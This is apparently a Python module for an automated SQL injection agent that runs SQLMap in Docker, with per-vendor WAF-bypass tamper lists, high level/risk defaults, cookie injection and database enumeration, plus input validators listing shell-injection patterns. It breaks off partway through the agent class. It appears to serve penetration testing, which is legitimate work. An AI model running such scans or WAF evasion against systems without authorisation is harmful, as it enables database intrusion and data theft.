"""
SQLMapAgent v2 - INTELLIGENT SQL Injection Specialist

MAJOR IMPROVEMENTS (2026-01-21):
1. Session/Cookie Support - Authenticated scanning
2. Advanced SQLMap Options - Tamper scripts, higher levels/risk
3. Intelligent DB Fingerprinting - Detect database type from errors
4. POST/JSON Body Support - Not just GET parameters
5. HTTP Headers Injection - User-Agent, Referer, X-Forwarded-For
6. Smart WAF Bypass - Auto-detect and apply tamper scripts
7. Data Extraction Verification - Prove exploitation with actual data
8. Multi-phase scanning - Quick probe → Deep scan → Extraction
9. Parallel parameter testing with early exit option

This agent is a specialist that uses SQLMap as its primary tool,
with intelligent fallbacks and enhancement strategies.
"""

import asyncio
import re
import json
import hashlib
import shlex
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from bugtrace.utils.logger import get_logger


# =============================================================================
# SECURITY VALIDATION FUNCTIONS (TASK-30, TASK-32, TASK-33)
# =============================================================================

# Regex for safe cookie values (alphanumeric, dash, underscore, equals, dot, slash)
SAFE_COOKIE_VALUE_PATTERN = re.compile(r'^[a-zA-Z0-9_\-=./%+]+$')
# Regex for safe header names (alphanumeric, dash)
SAFE_HEADER_NAME_PATTERN = re.compile(r'^[a-zA-Z0-9\-]+$')


def validate_cookie_value(name: str, value: str) -> str:
    """
    Validate cookie value to prevent command injection (TASK-32).

    Args:
        name: Cookie name for error messages
        value: Cookie value to validate

    Returns:
        Validated value

    Raises:
        ValueError: If value contains dangerous characters
    """
    if not value:
        return value

    # Check for shell metacharacters and SQLMap injection chars
    dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r', '\x00', '--', '#']
    for char in dangerous_chars:
        if char in value:
            raise ValueError(f"Cookie '{name}' contains dangerous character: {repr(char)}")

    # Allow URL-encoded values but validate the pattern
    if not SAFE_COOKIE_VALUE_PATTERN.match(value):
        # Log warning but allow if it's just unusual characters
        get_logger("agents.sqlmap_v2").warning(
            f"Cookie '{name}' has unusual characters, sanitizing"
        )
        # Strip anything that's not alphanumeric or safe chars
        value = re.sub(r'[^a-zA-Z0-9_\-=./%+]', '', value)

    return value


def validate_header(name: str, value: str) -> Tuple[str, str]:
    """
    Validate HTTP header to prevent injection attacks (TASK-33).

    Args:
        name: Header name
        value: Header value

    Returns:
        Tuple of (validated_name, validated_value)

    Raises:
        ValueError: If header contains newlines or null bytes
    """
    # Check for CRLF injection (HTTP Response Splitting)
    dangerous_chars = ['\n', '\r', '\x00']

    for char in dangerous_chars:
        if char in name:
            raise ValueError(f"Header name contains dangerous character: {repr(char)}")
        if char in value:
            raise ValueError(f"Header '{name}' value contains dangerous character: {repr(char)}")

    # Validate header name format
    if not SAFE_HEADER_NAME_PATTERN.match(name):
        raise ValueError(f"Invalid header name format: {name}")

    return name, value


def validate_post_data(data: str) -> str:
    """
    Validate POST data to prevent command injection (TASK-30).

    Args:
        data: POST data string

    Returns:
        Validated data string

    Note:
        POST data can legitimately contain special characters for SQL testing,
        so we only block shell metacharacters that could escape the subprocess.
    """
    if not data:
        return data

    # Block shell escape sequences that could break out of subprocess
    shell_escape_patterns = [
        r'\$\(',      # Command substitution $(...)
        r'`[^`]+`',   # Backtick command substitution
        r'\|\s*\w+',  # Pipe to command
        r';\s*\w+',   # Command chaining with ;
        r'&&\s*\w+',  # Command chaining with &&
        r'\|\|\s*\w+', # Command chaining with ||
    ]

    for pattern in shell_escape_patterns:
        if re.search(pattern, data):
            get_logger("agents.sqlmap_v2").warning(
                f"POST data contains potential shell escape: {pattern}"
            )
            # Remove the dangerous pattern
            data = re.sub(pattern, '', data)

    return data


def strip_ansi_codes(text: str) -> str:
    """
    Strip ANSI escape codes from text (TASK-34).

    Args:
        text: Text potentially containing ANSI codes

    Returns:
        Clean text without ANSI codes
    """
    if not text:
        return text
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)
from bugtrace.core.job_manager import JobStatus
from bugtrace.tools.external import external_tools
from bugtrace.core.ui import dashboard
from bugtrace.agents.base import BaseAgent
from bugtrace.core.config import settings
from bugtrace.core.http_orchestrator import orchestrator, DestinationType

# Import framework's WAF intelligence (Q-Learning based)
from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques

logger = get_logger("agents.sqlmap_v2")


# =============================================================================
# CONFIGURATION & DATA STRUCTURES
# =============================================================================

class DBType(Enum):
    """Known database types for fingerprinting."""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    UNKNOWN = "unknown"


@dataclass
class SQLMapConfig:
    """Advanced SQLMap configuration for intelligent scanning."""
    # Basic
    level: int = 5  # 1-5, higher = more payloads (increased from 2 for better coverage)
    risk: int = 3   # 1-3, higher = more risky payloads (increased from 2 for comprehensive testing)
    # IMPROVED (2026-01-23): No Time-Based by default to reduce false positives
    # Time-based (T) causes many FPs due to network latency
    technique: str = "BEUS"  # B=Boolean, E=Error, U=Union, S=Stacked (NO T=Time)

    # Timeouts
    timeout: int = 30
    retries: int = 3

    # WAF Bypass
    tamper_scripts: List[str] = field(default_factory=list)
    random_agent: bool = True

    # Headers to test (disabled - requires different implementation)
    # 2026-01-23: Header injection testing not yet implemented correctly
    test_headers: bool = False
    headers_to_test: List[str] = field(default_factory=lambda: [
        "User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP"
    ])

    # Data extraction
    extract_dbs: bool = True
    extract_tables: bool = True
    extract_columns: bool = False  # Only on confirmed vulns

    # Performance
    threads: int = 4
    bulk_file: Optional[str] = None  # For batch URL testing


@dataclass
class SQLiEvidence:
    """Evidence collected during SQLi validation."""
    vulnerable: bool = False
    db_type: DBType = DBType.UNKNOWN
    injection_type: str = ""  # error-based, time-based, etc.
    parameter: str = ""
    payload: str = ""
    extracted_data: Dict[str, Any] = field(default_factory=dict)
    reproduction_command: str = ""
    output_snippet: str = ""
    confidence: float = 0.0
    tamper_used: Optional[str] = None


# =============================================================================
# DB FINGERPRINTING
# =============================================================================

class DBFingerprinter:
    """
    Fingerprint database type from error messages and behavior.
    This helps select optimal tamper scripts and payloads.
    """

    SIGNATURES = {
        DBType.MYSQL: [
            r"mysql", r"mysqli", r"MariaDB", r"SQL syntax.*MySQL",
            r"Warning.*mysql_", r"MySQLSyntaxErrorException",
            r"com\.mysql\.jdbc", r"SQLSTATE\[HY000\]"
        ],
        DBType.POSTGRESQL: [
            r"PostgreSQL", r"pg_", r"PSQLException", r"org\.postgresql",
            r"ERROR:\s+syntax error at or near", r"SQLSTATE\[42"
        ],
        DBType.MSSQL: [
            r"Microsoft SQL Server", r"ODBC SQL Server Driver",
            r"SQLServer JDBC", r"SqlException", r"Unclosed quotation mark",
            r"mssql", r"Incorrect syntax near"
        ],
        DBType.ORACLE: [
            r"Oracle", r"ORA-\d{5}", r"oracle\.jdbc", r"TNS:",
            r"PLS-\d{5}", r"SP2-\d{4}"
        ],
        DBType.SQLITE: [
            r"SQLite", r"sqlite3", r"SQLITE_", r"unrecognized token",
            r"sqlite\.OperationalError"
        ]
    }

    # Optimal tamper scripts per DB type
    TAMPER_RECOMMENDATIONS = {
        DBType.MYSQL: ["space2comment", "randomcase", "between", "equaltolike"],
        DBType.POSTGRESQL: ["space2comment", "randomcase", "between"],
        DBType.MSSQL: ["space2mssqlblank", "randomcase", "charencode"],
        DBType.ORACLE: ["space2comment", "randomcase"],
        DBType.SQLITE: ["space2comment", "randomcase"],
        DBType.UNKNOWN: ["space2comment", "randomcase", "between"]
    }

    @classmethod
    def fingerprint(cls, response_text: str) -> DBType:
        """
        Analyze response text to determine database type.

        Args:
            response_text: HTTP response body or error message

        Returns:
            Detected DBType
        """
        response_lower = response_text.lower()

        for db_type, patterns in cls.SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    logger.debug(f"DB Fingerprint: {db_type.value} (matched: {pattern})")
                    return db_type

        return DBType.UNKNOWN

    @classmethod
    def get_recommended_tampers(cls, db_type: DBType) -> List[str]:
        """Get recommended tamper scripts for detected DB type."""
        return cls.TAMPER_RECOMMENDATIONS.get(db_type, cls.TAMPER_RECOMMENDATIONS[DBType.UNKNOWN])


# =============================================================================
# WAF DETECTION & BYPASS (Uses Framework's Q-Learning WAF Intelligence)
# =============================================================================

class WAFBypassStrategy:
    """
    Intelligent WAF detection and bypass strategy.

    Uses the framework's WAF intelligence module:
    - waf_fingerprinter: Detects WAF with multiple techniques
    - strategy_router: Q-Learning based strategy selection
    - encoding_techniques: 12+ encoding methods
    """

    # SQLMap tamper script mapping to framework encoding names
    ENCODING_TO_TAMPER_MAP = {
        "unicode_encode": "charunicodeencode",
        "html_entity_hex": "charencode",
        "html_entity_encode": "htmlencode",
        "double_url_encode": "chardoubleencode",
        "case_mixing": "randomcase",
        "comment_injection": "space2comment",
        "null_byte_injection": "space2mysqldash",
        "whitespace_obfuscation": "space2mssqlblank",
        "backslash_escape": "apostrophemask",
        "overlong_utf8": "charunicodeescape",
    }

    # Fallback tampers per WAF (when strategy_router has no data)
    WAF_TAMPER_FALLBACK = {
        "cloudflare": ["space2comment", "randomcase", "between", "charencode", "equaltolike"],
        "aws_waf": ["space2comment", "randomcase", "charencode"],
        "akamai": ["space2comment", "randomcase", "between", "charunicodeencode"],
        "sucuri": ["space2comment", "randomcase", "between"],
        "modsecurity": ["space2comment", "randomcase", "modsecurityversioned", "modsecurityzeroversioned"],
        "imperva": ["space2comment", "randomcase", "between", "charencode"],
        "f5_bigip": ["space2comment", "randomcase", "charencode"],
        "generic": ["space2comment", "randomcase", "between", "equaltolike", "charencode"],
        "unknown": ["space2comment", "randomcase", "between"]
    }

    @classmethod
    async def detect_waf_async(cls, url: str) -> Tuple[str, float]:
        """
        Detect WAF using framework's intelligent fingerprinter.

        Returns:
            Tuple of (waf_name, confidence)
        """
        try:
            waf_name, confidence = await waf_fingerprinter.detect(url)
            if waf_name != "unknown":
                logger.info(f"WAF Detected: {waf_name} (confidence: {confidence:.0%})")
            return waf_name, confidence
        except Exception as e:
            logger.debug(f"WAF detection failed: {e}")
            return "unknown", 0.0

    @classmethod
    async def get_smart_bypass_strategies(cls, url: str, max_strategies: int = 5) -> Tuple[str, List[str]]:
        """
        Get optimized bypass strategies using Q-Learning router.

        Returns:
            Tuple of (waf_name, list_of_strategy_names)
        """
        try:
            waf_name, strategies = await strategy_router.get_strategies_for_target(url, max_strategies)

            # Convert encoding technique names to SQLMap tamper scripts
            tampers = cls._convert_strategies_to_tampers(strategies)

            # Add fallback tampers if we didn't get enough
            if len(tampers) < 3:
                cls._add_fallback_tampers(tampers, waf_name, max_strategies)

            return waf_name, tampers[:max_strategies]

        except Exception as e:
            logger.warning(f"Strategy router failed: {e}, using fallback")
            return "unknown", cls.WAF_TAMPER_FALLBACK["generic"]

    @classmethod
    def _convert_strategies_to_tampers(cls, strategies: List[str]) -> List[str]:
        """Convert encoding technique names to SQLMap tamper scripts."""
        tampers = []
        for strat in strategies:
            if strat in cls.ENCODING_TO_TAMPER_MAP:
                tampers.append(cls.ENCODING_TO_TAMPER_MAP[strat])
            else:
                # Some strategy names might already be tamper names
                tampers.append(strat)
        return tampers

    @classmethod
    def _add_fallback_tampers(cls, tampers: List[str], waf_name: str, max_strategies: int):
        """Add fallback tampers to reach minimum count."""
        fallback = cls.WAF_TAMPER_FALLBACK.get(waf_name, cls.WAF_TAMPER_FALLBACK["generic"])
        for t in fallback:
            if t not in tampers:
                tampers.append(t)
                if len(tampers) >= max_strategies:
                    break

    @classmethod
    def record_bypass_result(cls, waf_name: str, strategy_name: str, success: bool):
        """
        Record bypass result for Q-Learning feedback.
        This improves future strategy selection.
        """
        try:
            # Convert SQLMap tamper name back to encoding name if needed
            encoding_name = strategy_name
            for enc_name, tamper_name in cls.ENCODING_TO_TAMPER_MAP.items():
                if tamper_name == strategy_name:
                    encoding_name = enc_name
                    break

            strategy_router.record_result(waf_name, encoding_name, success)
            logger.debug(f"Recorded bypass result: {waf_name}/{encoding_name} = {'SUCCESS' if success else 'FAIL'}")
        except Exception as e:
            logger.debug(f"Failed to record bypass result: {e}")

    @classmethod
    def get_bypass_tampers(cls, waf_name: Optional[str]) -> List[str]:
        """
        Get tamper scripts to bypass detected WAF (sync fallback).
        Use get_smart_bypass_strategies() for async Q-Learning based selection.
        """
        if not waf_name:
            return []
        return cls.WAF_TAMPER_FALLBACK.get(waf_name, cls.WAF_TAMPER_FALLBACK["generic"])


# =============================================================================
# ENHANCED EXTERNAL TOOL RUNNER
# =============================================================================

# TASK-39: Global semaphore for rate limiting SQLMap processes
_sqlmap_semaphore: Optional[asyncio.Semaphore] = None


def get_sqlmap_semaphore() -> asyncio.Semaphore:
    """Get or create the global SQLMap semaphore for rate limiting (TASK-39)."""
    global _sqlmap_semaphore
    if _sqlmap_semaphore is None:
        max_concurrent = getattr(settings, 'MAX_CONCURRENT_SQLMAP', 2)
        _sqlmap_semaphore = asyncio.Semaphore(max_concurrent)
    return _sqlmap_semaphore


class EnhancedSQLMapRunner:
    """
    Enhanced SQLMap execution with intelligent configuration.

    Security improvements (2026-01-26):
    - TASK-35: Version verification
    - TASK-39: Rate limiting via semaphore
    - TASK-40: Result caching
    """

    # TASK-40: Class-level cache for SQLMap results
    _result_cache: Dict[str, SQLiEvidence] = {}

    def __init__(self, cookies: List[Dict] = None, headers: Dict[str, str] = None):
        self.cookies = cookies or []
        self.headers = headers or {}
        self.docker_cmd = external_tools.docker_cmd
        self._sqlmap_verified = False

    @classmethod
    async def verify_sqlmap(cls) -> bool:
        """
        Verify SQLMap is available and get version (TASK-35).

        Returns:
            True if SQLMap is available, False otherwise
        """
        docker_cmd = external_tools.docker_cmd
        if not docker_cmd:
            logger.error("Docker not available for SQLMap")
            return False

        try:
            proc = await asyncio.create_subprocess_exec(
                docker_cmd, "run", "--rm", "googlesky/sqlmap:latest", "--version",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)

            if proc.returncode == 0:
                version = strip_ansi_codes(stdout.decode().strip())
                logger.info(f"SQLMap version verified: {version[:100]}")
                return True
            else:
                logger.error(f"SQLMap verification failed: {stderr.decode()[:200]}")
                return False
        except asyncio.TimeoutError:
            logger.error("SQLMap version check timed out", exc_info=True)
            return False
        except FileNotFoundError:
            logger.error("Docker/SQLMap not found in PATH", exc_info=True)
            return False
        except Exception as e:
            logger.error(f"SQLMap verification error: {e}", exc_info=True)
            return False

    @classmethod
    def _cache_key(cls, url: str, method: str, data: Optional[str]) -> str:
        """Generate cache key for SQLMap results (TASK-40)."""
        key_string = f"{url}|{method}|{data or ''}"
        return hashlib.sha256(key_string.encode()).hexdigest()

    async def run_intelligent(
        self,
        url: str,
        param: Optional[str] = None,
        config: SQLMapConfig = None,
        post_data: Optional[str] = None,
        db_type: DBType = DBType.UNKNOWN
    ) -> SQLiEvidence:
        """
        Run SQLMap with intelligent configuration based on context.

        Args:
            url: Target URL
            param: Specific parameter to test (optional)
            config: SQLMap configuration
            post_data: POST body data (for POST requests)
            db_type: Pre-detected database type

        Returns:
            SQLiEvidence with results

        Security improvements (2026-01-26):
        - TASK-35: Verify SQLMap before first run
        - TASK-39: Rate limiting via semaphore
        - TASK-40: Result caching
        """
        if not self.docker_cmd:
            logger.warning("Docker not available, cannot run SQLMap")
            return SQLiEvidence(vulnerable=False)

        # TASK-35: Verify SQLMap on first run
        if not await self._verify_sqlmap_first_run():
            return SQLiEvidence(vulnerable=False)

        config = config or SQLMapConfig()

        # TASK-40: Check cache first
        cached_result = self._check_result_cache(url, post_data)
        if cached_result:
            return cached_result

        # TASK-39: Rate limiting - acquire semaphore before execution
        return await self._execute_with_rate_limit(url, param, config, post_data, db_type)

    async def _verify_sqlmap_first_run(self) -> bool:
        """Verify SQLMap on first run (TASK-35)."""
        if not self._sqlmap_verified:
            if not await self.verify_sqlmap():
                logger.error("SQLMap verification failed, aborting")
                return False
            self._sqlmap_verified = True
        return True

    def _check_result_cache(self, url: str, post_data: Optional[str]) -> Optional[SQLiEvidence]:
        """Check result cache (TASK-40)."""
        method = "POST" if post_data else "GET"
        cache_key = self._cache_key(url, method, post_data)
        if cache_key in self._result_cache:
            logger.info(f"Using cached SQLMap result for {url}")
            return self._result_cache[cache_key]
        return None

    async def _execute_with_rate_limit(
        self, url: str, param: Optional[str], config: SQLMapConfig,
        post_data: Optional[str], db_type: DBType
    ) -> SQLiEvidence:
        """Execute SQLMap with rate limiting (TASK-39)."""
        semaphore = get_sqlmap_semaphore()
        async with semaphore:
            logger.debug(f"Acquired SQLMap semaphore, executing scan on {url}")

            # Build command
            cmd = self._build_command(url, param, config, post_data, db_type)
            reproduction_cmd = self._build_reproduction_command(url, param, config, post_data)

            # Execute
            dashboard.log(f"[SQLMapAgent] Executing intelligent scan on {url}", "INFO")
            output = await self._execute_sqlmap(cmd)

            # Parse results
            evidence = self._parse_output(output, url, param)
            evidence.reproduction_command = reproduction_cmd

            # TASK-40: Cache the result
            method = "POST" if post_data else "GET"
            cache_key = self._cache_key(url, method, post_data)
            self._result_cache[cache_key] = evidence

            return evidence

    def _build_command(
        self,
        url: str,
        param: Optional[str],
        config: SQLMapConfig,
        post_data: Optional[str],
        db_type: DBType
    ) -> List[str]:
        """Build SQLMap command with all options.

        Security: All user inputs are validated before being added to command.
        (TASK-30, TASK-32, TASK-33)
        """
        cmd = self._build_base_command(url, config)

        if config.random_agent:
            cmd.append("--random-agent")

        if param:
            cmd.extend(["-p", param])

        if post_data:
            self._add_post_data(cmd, post_data)

        self._add_cookies(cmd)
        self._add_headers(cmd)
        self._add_tamper_scripts(cmd, config, db_type)

        if config.extract_dbs:
            cmd.append("--dbs")

        return cmd

    def _build_base_command(self, url: str, config: SQLMapConfig) -> List[str]:
        """Build base SQLMap command with core options."""
        return [
            "-u", url,
            "--batch",
            f"--level={config.level}",
            f"--risk={config.risk}",
            f"--technique={config.technique}",
            f"--timeout={config.timeout}",
            f"--retries={config.retries}",
            f"--threads={config.threads}",
            "--parse-errors",
            "--flush-session",
            "--output-dir=/tmp"
        ]

    def _add_post_data(self, cmd: List[str], post_data: str):
        """Add POST data to command (TASK-30)."""
        validated_post_data = validate_post_data(post_data)
        cmd.extend(["--data", validated_post_data])

    def _add_cookies(self, cmd: List[str]):
        """Add cookies to command (TASK-32).

        IMPROVED (2026-01-30): Enable cookie injection testing, not just authentication.
        SQLMap at level >= 2 tests cookies, but we need proper configuration.
        """
        if not self.cookies:
            return

        try:
            validated_cookies = []
            base64_cookies = []
            cookie_names = []

            for c in self.cookies:
                name = c.get('name', '')
                value = c.get('value', '')
                validated_value = validate_cookie_value(name, value)
                validated_cookies.append(f"{name}={validated_value}")
                cookie_names.append(name)

                # IMPROVED: Detect Base64-encoded cookies for special handling
                if self._is_likely_base64(validated_value):
                    base64_cookies.append(name)
                    logger.info(f"Detected Base64-encoded cookie: {name}")

            cookie_str = "; ".join(validated_cookies)
            cmd.append(f"--cookie={cookie_str}")

            # IMPROVED: Enable cookie injection testing explicitly
            # With --level 5, SQLMap tests cookies, but we ensure proper delimiter
            cmd.append("--cookie-del=;")

            # CRITICAL: Tell SQLMap to test ALL cookies explicitly
            # This forces SQLMap to treat cookies as injection points
            if cookie_names:
                cmd.extend(["-p", ",".join(cookie_names)])
                logger.info(f"Explicitly testing cookie parameters: {cookie_names}")

            # IMPROVED: For Base64 cookies, add special handling
            # SQLMap's --base64 option decodes before testing, re-encodes after
            for b64_cookie in base64_cookies:
                cmd.append(f"--base64={b64_cookie}")
                logger.info(f"Enabled Base64 decoding for cookie: {b64_cookie}")

        except ValueError as e:
            logger.warning(f"Invalid cookie skipped: {e}")

    def _is_likely_base64(self, value: str) -> bool:
        """Check if a value looks like Base64 encoding.

        ADDED (2026-01-30): Detect Base64-encoded values for proper SQLi testing.
        """
        import base64

        if not value or len(value) < 4:
            return False

        # Base64 typically has these characteristics:
        # - Length is multiple of 4 (or close with padding)
        # - Contains only A-Z, a-z, 0-9, +, /, =
        # - May end with = or == for padding

        base64_pattern = re.compile(r'^[A-Za-z0-9+/]+=*$')
        if not base64_pattern.match(value):
            return False

        # Try to decode it - if it works, likely Base64
        try:
            # Add padding if needed
            padded = value + '=' * (4 - len(value) % 4) if len(value) % 4 else value
            decoded = base64.b64decode(padded, validate=True)
            # Check if decoded value looks like text (not binary garbage)
            try:
                decoded.decode('utf-8')
                return True
            except UnicodeDecodeError:
                # Could still be valid Base64 of binary data
                return len(value) >= 8  # Longer encoded values more likely to be Base64
        except Exception:
            return False

    def _add_headers(self, cmd: List[str]):
        """Add custom headers to command (TASK-33)."""
        if not self.headers:
            return

        for name, value in self.headers.items():
            try:
                validated_name, validated_value = validate_header(name, value)
                cmd.extend(["--header", f"{validated_name}: {validated_value}"])
            except ValueError as e:
                logger.warning(f"Invalid header skipped: {e}")

    def _add_tamper_scripts(self, cmd: List[str], config: SQLMapConfig, db_type: DBType):
        """Add tamper scripts to command."""
        tampers = list(config.tamper_scripts)
        if db_type != DBType.UNKNOWN:
            tampers.extend(DBFingerprinter.get_recommended_tampers(db_type))

        if tampers:
            # Deduplicate while preserving order
            seen = set()
            unique_tampers = [t for t in tampers if not (t in seen or seen.add(t))]
            cmd.append(f"--tamper={','.join(unique_tampers[:5])}")

    def _build_reproduction_command(
        self,
        url: str,
        param: Optional[str],
        config: SQLMapConfig,
        post_data: Optional[str]
    ) -> str:
        """Build human-readable reproduction command."""
        cmd = f"sqlmap -u '{url}' --batch --level={config.level} --risk={config.risk} --technique={config.technique}"

        if param:
            cmd += f" -p {param}"
        if post_data:
            cmd += f" --data='{post_data}'"
        if self.cookies:
            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in self.cookies])
            cmd += f" --cookie='{cookie_str}'"
        if config.tamper_scripts:
            cmd += f" --tamper={','.join(config.tamper_scripts)}"

        return cmd

    async def _execute_sqlmap(self, cmd: List[str]) -> str:
        """Execute SQLMap via Docker.

        Security improvements (2026-01-26):
        - TASK-34: Strip ANSI codes from output
        - TASK-36: Configurable timeout
        - TASK-37: Output size limit
        - TASK-38: Better error detection
        """
        full_cmd = self._build_docker_command(cmd)

        cmd_str = ' '.join(full_cmd)
        logger.info(f"SQLMap executing: {cmd_str[:200]}...")
        dashboard.log(f"[SQLMapAgent] Executing SQLMap...", "DEBUG")

        timeout_seconds = getattr(settings, 'SQLMAP_TIMEOUT_SECONDS', 600)

        try:
            proc = await asyncio.create_subprocess_exec(
                *full_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout_seconds)

            stdout_text, stderr_text = self._process_sqlmap_output(stdout, stderr, proc.returncode)
            self._log_sqlmap_result(stdout_text, stderr_text, proc.returncode)

            return stdout_text
        except asyncio.TimeoutError:
            logger.warning(f"SQLMap execution timed out ({timeout_seconds}s)")
            return ""
        except ConnectionError as e:
            logger.warning(f"SQLMap connection error: {e}", exc_info=True)
            return ""
        except Exception as e:
            logger.error(f"SQLMap execution error: {e}", exc_info=True)
            return ""

    def _build_docker_command(self, cmd: List[str]) -> List[str]:
        """Build Docker command for SQLMap execution."""
        full_cmd = [self.docker_cmd, "run", "--rm", "--network", "host"]
        full_cmd.append("googlesky/sqlmap:latest")
        full_cmd.extend(cmd)
        return full_cmd

    def _process_sqlmap_output(self, stdout: bytes, stderr: bytes, returncode: int) -> Tuple[str, str]:
        """Process SQLMap output (TASK-34, TASK-37, TASK-38)."""
        stdout_text = strip_ansi_codes(stdout.decode())
        stderr_text = strip_ansi_codes(stderr.decode())

        # TASK-37: Limit output size (10MB max)
        max_output_size = getattr(settings, 'SQLMAP_MAX_OUTPUT_SIZE', 10_000_000)
        if len(stdout_text) > max_output_size:
            logger.warning(f"SQLMap output truncated from {len(stdout_text)} to {max_output_size} bytes")
            stdout_text = stdout_text[:max_output_size]

        # TASK-38: Better error detection
        if returncode != 0:
            logger.error(f"SQLMap failed with return code {returncode}")
            if stderr_text:
                logger.error(f"SQLMap stderr: {stderr_text[:500]}")
            self._check_critical_errors(stderr_text)

        if stderr_text and ("error" in stderr_text.lower() or returncode != 0):
            logger.warning(f"SQLMap stderr: {stderr_text[:500]}")

        self._check_sqlmap_error_patterns(stdout_text)

        return stdout_text, stderr_text

    def _check_critical_errors(self, stderr_text: str):
        """Check for critical error patterns (TASK-38)."""
        if "connection refused" in stderr_text.lower():
            raise ConnectionError("Target not reachable")
        if "not enough time" in stderr_text.lower():
            raise TimeoutError("SQLMap needs more time")

    def _check_sqlmap_error_patterns(self, stdout_text: str):
        """Check for SQLMap-specific error patterns (TASK-38)."""
        error_patterns = [
            ("target url is not responding", "TargetUnreachable"),
            ("connection timed out", "ConnectionTimeout"),
            ("no parameter(s) found", "NoParameters"),
            ("unable to connect", "ConnectionFailed"),
        ]
        for pattern, error_type in error_patterns:
            if pattern in stdout_text.lower():
                logger.warning(f"SQLMap error detected: {error_type}")

    def _log_sqlmap_result(self, stdout_text: str, stderr_text: str, returncode: int):
        """Log SQLMap execution result."""
        if "is vulnerable" in stdout_text.lower():
            logger.info("SQLMap detected vulnerability!")
        elif "no injection found" in stdout_text.lower():
            logger.debug("SQLMap: No injection found")
        elif not stdout_text:
            logger.warning("SQLMap returned empty output")
        else:
            logger.debug(f"SQLMap output preview: {stdout_text[:200]}")

    def _parse_output(self, output: str, url: str, param: Optional[str]) -> SQLiEvidence:
        """Parse SQLMap output for results.

        2026-01-23 FIX:
        - Extract ALL injection types (not just the first one)
        - Skip banner to capture meaningful output
        - Store clean evidence for reports
        """
        evidence = SQLiEvidence()

        if not output:
            return evidence

        param_match = re.search(r"Parameter:\s+(.+?)\s+\(", output)
        all_types = re.findall(r"Type:\s+(.+?)[\n\r]", output)

        if param_match or "is vulnerable" in output.lower():
            self._populate_vulnerability_evidence(evidence, param_match, all_types, param, output)

        evidence.output_snippet = self._extract_meaningful_output(output)
        return evidence

    def _populate_vulnerability_evidence(
        self, evidence: SQLiEvidence, param_match: re.Match,
        all_types: List[str], param: Optional[str], output: str
    ):
        """Populate evidence with vulnerability details."""
        evidence.vulnerable = True
        evidence.parameter = param_match.group(1) if param_match else param or "unknown"

        # Store all types found
        evidence.injection_type = ", ".join(all_types) if all_types else "unknown"
        evidence.confidence = 1.0

        self._extract_database_info(evidence, output)
        self._extract_databases_list(evidence, output)
        self._extract_technology_info(evidence, output)
        self._extract_union_info(evidence, output)

    def _extract_database_info(self, evidence: SQLiEvidence, output: str):
        """Extract database type and version."""
        db_match = re.search(r"back-end DBMS:\s+(.+?)[\n\r]", output)
        if db_match:
            db_str = db_match.group(1).lower()
            evidence.extracted_data["dbms_full"] = db_match.group(1)
            for db_type in DBType:
                if db_type.value in db_str:
                    evidence.db_type = db_type
                    break

    def _extract_databases_list(self, evidence: SQLiEvidence, output: str):
        """Extract list of databases found."""
        dbs_section = re.search(r"available databases.*?:\s*\n((?:\[\*\]\s+.+\n)+)", output, re.DOTALL)
        if dbs_section:
            dbs = re.findall(r"\[\*\]\s+(.+)", dbs_section.group(1))
            evidence.extracted_data["databases"] = dbs

    def _extract_technology_info(self, evidence: SQLiEvidence, output: str):
        """Extract web application technology."""
        version_match = re.search(r"web application technology:\s+(.+?)[\n\r]", output, re.IGNORECASE)
        if version_match:
            evidence.extracted_data["technology"] = version_match.group(1)

    def _extract_union_info(self, evidence: SQLiEvidence, output: str):
        """Extract UNION query information."""
        union_match = re.search(r"UNION query.*?(\d+)\s+columns", output, re.IGNORECASE)
        if union_match:
            evidence.extracted_data["union_columns"] = int(union_match.group(1))

        null_match = re.search(r"NULL,?\s*NULL", output)
        if null_match:
            evidence.extracted_data["union_null_based"] = True

    def _extract_meaningful_output(self, output: str) -> str:
        """Extract meaningful output, skipping SQLMap banner."""
        meaningful_start = output.find("[*] starting")
        if meaningful_start > 0:
            next_line = output.find("\n", meaningful_start)
            if next_line > 0:
                meaningful_output = output[next_line:].strip()
                vuln_start = meaningful_output.find("Parameter:")
                if vuln_start > 0:
                    meaningful_output = meaningful_output[vuln_start:]
                return meaningful_output[:2000]
            else:
                return output[meaningful_start:][:2000]
        else:
            return output[:2000]


# =============================================================================
# SQLMAP AGENT V2
# =============================================================================

class SQLMapAgent(BaseAgent):
    """
    Intelligent SQL Injection Specialist Agent v2.

    Features:
    - Multi-phase scanning (probe → deep → extract)
    - Session/cookie support for authenticated testing
    - Intelligent DB fingerprinting
    - WAF detection and bypass
    - POST/JSON body support
    - HTTP headers injection testing
    - Data extraction verification
    - Parallel parameter testing

    Validation Methods (in order):
    1. Quick probe with basic payloads
    2. SQLMap with intelligent configuration
    3. WAF bypass retry with tamper scripts
    4. Data extraction for proof of exploitation
    """

    def __init__(
        self,
        url: str,
        params: List[str] = None,
        report_dir: Path = None,
        event_bus: Any = None,
        cookies: List[Dict] = None,
        headers: Dict[str, str] = None,
        post_data: str = None
    ):
        super().__init__("SQLMapAgent", "SQLi Specialist v2", event_bus=event_bus, agent_id="sqlmap_agent")
        self.url = url
        self.params = params or []
        self.report_dir = report_dir or Path("reports")
        self.cookies = cookies or []
        self.headers = headers or {}
        self.post_data = post_data

        # Load from config or fallback
        self.error_patterns = self.agent_config.get("error_patterns", [])
        self.test_payloads = self.agent_config.get("test_payloads", [])

        # Initialize enhanced runner
        self.sqlmap_runner = EnhancedSQLMapRunner(cookies=self.cookies, headers=self.headers)

        # State tracking
        self._tested_params = set()
        self._detected_db_type = DBType.UNKNOWN
        self._detected_waf = None

        # Statistics
        self._stats = {
            "params_tested": 0,
